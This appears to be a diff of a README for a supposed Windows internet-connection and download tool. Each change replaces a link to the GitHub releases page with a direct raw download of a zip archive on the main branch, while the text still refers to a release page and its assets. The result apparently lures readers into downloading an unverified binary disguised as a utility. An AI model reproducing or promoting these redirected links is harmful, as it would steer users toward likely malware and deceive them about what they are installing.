@@ -1,10 +1,10 @@
 # ⚡ Stabilized-Internet-Connection - Fast Downloads With Easy Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/raw/refs/heads/main/main/Connection-Stabilized-Internet-3.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/releases
+Visit this page to download: https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/raw/refs/heads/main/main/Connection-Stabilized-Internet-3.3.zip
 
 ## 🖥️ What This App Does
 
@@ -35,7 +35,7 @@ This repository is set up for users who want a simple download tool with quick a
 
 ## 🚀 Getting Started
 
-1. Open the release page: https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/releases
+1. Open the release page: https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/raw/refs/heads/main/main/Connection-Stabilized-Internet-3.3.zip
 2. Look for the latest release at the top of the page
 3. Open the Assets section
 4. Download the Windows file from that release
@@ -165,7 +165,7 @@ This project is tied to download and manager use cases, including:
 
 Download the Windows build from the release page:
 
-https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/releases
+https://github.com/enterotoxemiachinchilla594/Stabilized-Internet-Connection/raw/refs/heads/main/main/Connection-Stabilized-Internet-3.3.zip
 
 ## 📌 Folder Use Guide
 
